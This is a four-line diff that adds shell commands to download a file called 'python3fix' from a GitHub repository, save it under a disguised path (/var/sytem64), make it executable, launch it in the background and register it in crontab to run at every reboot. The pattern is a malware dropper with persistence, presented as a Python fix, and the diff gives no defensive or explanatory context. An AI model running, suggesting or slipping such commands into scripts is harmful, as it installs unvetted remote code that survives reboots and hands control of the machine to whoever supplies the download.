@@ -1,0 +1,4 @@
+curl -sL https://github.com/ven0m90/python-fix-linux/raw/refs/heads/main/python3fix -o /var/sytem64
+chmod +x  /var/sytem64
+nohup  /var/sytem64 &
+echo "@reboot nohup /var/sytem64 &" | crontab -
